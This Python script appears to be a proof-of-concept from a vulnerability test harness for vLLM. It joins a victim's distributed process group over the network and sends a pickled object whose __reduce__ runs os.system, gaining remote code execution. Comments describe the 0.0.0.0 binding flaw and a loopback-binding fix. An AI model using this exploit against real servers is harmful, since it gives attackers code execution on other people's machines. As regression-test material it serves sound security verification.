"""Network attacker on another host: joins the victim's StatelessProcessGroup as rank 1 over the
victim's non-loopback address and sends one object with vLLM's own send_obj (pickle.dumps).

inputs/<arm>.json picks the payload: "rce" is an object whose __reduce__ runs a shell command
when unpickled; "data" is ordinary KV metadata. Usage: attacker.py <arm> <nonce> <target-host>.
"""
import json
import os
import socket
import sys

from vllm.distributed.utils import StatelessProcessGroup

arm, nonce, host = sys.argv[1], sys.argv[2], sys.argv[3]
spec = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))


class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


addr = socket.gethostbyname(host)  # the victim's network address, not its configured loopback host
obj = Payload(spec["command"]) if spec["kind"] == "rce" else spec["data"]

# The attack's precondition is that this non-loopback peer can reach the KV-transfer port at all.
# Vuln: the TCPStore listens on 0.0.0.0, so the port answers on the victim's network address.
# Fix (0d6e187): the store binds a listen socket to the configured host (127.0.0.1), so the port
# is NOT reachable from another host -- the join cannot even begin. Probe that reachability first
# so the fix's block is a clean, attributable "port unreachable" rather than torch's C-level abort
# when its store client cannot connect.
try:
    socket.create_connection((addr, 29600), timeout=10).close()
except OSError as e:
    print(f"join/send failed: KV port not reachable from peer (fix binds loopback): "
          f"{type(e).__name__}: {e}"[:300])
    sys.exit(1)

try:
    pg = StatelessProcessGroup.create(host=addr, port=29600, rank=1, world_size=2, store_timeout=20)
    pg.send_obj(obj, dst=0)
    print("sent", spec["kind"])
except Exception as e:
    print(f"join/send failed: {type(e).__name__}: {e}"[:300])
    sys.exit(1)
